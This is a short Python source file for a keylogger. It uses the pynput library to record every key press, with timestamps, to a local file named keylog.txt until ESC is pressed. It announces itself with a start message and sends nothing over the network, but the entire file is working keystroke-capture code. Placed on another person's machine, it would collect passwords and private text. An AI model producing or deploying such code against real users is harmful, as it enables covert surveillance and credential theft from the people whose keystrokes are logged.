from pynput import keyboard
import logging
import os

# Set up logging to file
log_dir = ""
logging.basicConfig(filename=(log_dir + "keylog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

print("Keylogger started... (Press ESC to stop)")

def on_press(key):
    try:
        logging.info(str(key))
    except Exception as e:
        print(f"Error: {e}")

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
